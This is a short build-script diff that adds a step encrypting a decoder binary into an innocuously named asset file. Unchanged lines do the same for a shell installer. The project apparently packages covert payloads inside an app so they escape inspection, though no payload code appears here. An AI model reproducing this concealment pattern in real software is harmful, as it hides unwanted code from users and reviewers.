@@ -128,6 +128,8 @@
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}k" inputFile="preprocess/shell_installer.sh" outputFile="assets/kb.data" />
         <delete file="assets/bb.data" />
         <crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}b" inputFile="preprocess/bbmdecoder" outputFile="assets/bb.data" />
+        <delete file="assets/bbl.data" />
+        <crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}b" inputFile="preprocess/bbmdecoder5" outputFile="assets/bbl.data" />
 
     </target>
 
